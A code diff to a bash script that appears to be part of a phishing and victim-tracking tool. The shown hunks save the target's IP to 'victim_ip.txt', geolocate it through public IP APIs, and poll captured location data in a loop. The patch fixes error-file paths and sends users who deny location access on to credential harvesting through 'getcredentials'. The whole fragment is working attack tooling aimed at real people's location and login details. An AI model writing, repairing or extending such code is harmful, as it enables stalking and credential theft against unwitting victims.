@@ -212,8 +212,8 @@ printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m victim_ip.txt\e[0m\n"
 cat .server/location/ip.txt >> victim_ip.txt
 
-ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
-ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
+ipaddripapico=$(curl -s "https://ipapi.co/$glocip/json" -L)
+ipaddripapicom=$(curl -s "http://ip-api.com/json/$glocip" -L)
 usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
@@ -240,27 +240,36 @@ printf "\e[0m\n"
 
 while [ true ]; do
 
-
 if [[ -e ".server/location/location.txt" ]]; then
 gloc_catch_cred
 
 fi
 sleep 0.5
 if [[ -e ".server/location/error.txt" ]]; then
-checkerror=$(grep -o 'Error:.*' server/error.txt | cut -d " " -f2 | tr -d ' ' )
+checkerror=$(grep -o 'Error:.*' .server/location/error.txt | cut -d " " -f2 | tr -d ' ' )
 if [[ $checkerror == 1 ]]; then
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m User Denied Access !!\e[0m\n"
-rm -rf server/error.txt
 
+rm -rf .server/location/error.txt
+getcredentials
+elif [[ $checkerror == 2 ]]; then
+
+rm -rf .server/location/error.txt
+getcredentials
+elif [[ $checkerror == 3 ]]; then
+
+rm -rf .server/location/error.txt
+getcredentials
+elif [[ $checkerror == 4 ]]; then
+rm -rf .server/location/error.txt
+getcredentials
 else
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m User Denied Access !!\e[0m\n"
 exit 1
 fi
 fi
-
 sleep 0.5
 
-done
+done 
 
 }
 
